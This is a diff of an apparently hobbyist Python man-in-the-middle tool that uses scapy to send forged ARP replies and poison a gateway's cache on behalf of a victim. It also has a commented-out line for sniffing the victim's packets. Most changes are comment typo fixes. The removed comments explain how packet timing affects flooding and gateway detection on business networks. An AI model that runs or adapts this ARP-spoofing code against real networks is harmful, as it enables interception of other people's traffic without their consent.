@@ -67,19 +67,10 @@ class mitm:
                 send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=self.gateway_mac), verbose=False) #send to gateway
                 # pkts = sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%}"), filter=f"ip host {self.victim_ip} and not arp")
                 # uncommenting the above line will make the program sniff the packets and print them to the screen.
-                # it could be useful for debugging purposes or to program a little bit of extra functionality such as an ip or a dns detector
-                # but I highly recommend using wireshark for the packet shelling since it's way more conveinient and it's a lot more powerful / complete
+                # it could be useful for debugging purposes or to program a little bit of extra functionalities
+                # but I highly recommend using wireshark for the packet shelling since it's way more convenient and it's a lot more powerful / complete
                 sleep(0.5)
-                # the packet sent to your victim will make it think that you are a gateway and will consider you as it's nexthop (nearest router)
-                #
-                # reducing the timing between each sent packet would actually flood both the gateway and the victim
-                # some gateway detects these packets and block the sender (you) from comunicating, you would get blacklisted
-                # from the gateway on some cases (business networks for example)
-                #
-                # increasing the delay would actually be easier for your machine to handle with some side programs running but you might
-                # loose some packets from the victim to the gateway because the actual gateway could send some packets like you and tell the
-                # victim that it's in fact the nearest gateway :(
-                # wierd explaination but I will make it clearer on a nice readme.md file once the project if fully done
+
         except KeyboardInterrupt:
             ui.uprint("Stopping MITM attack")
             IPForward_switch()
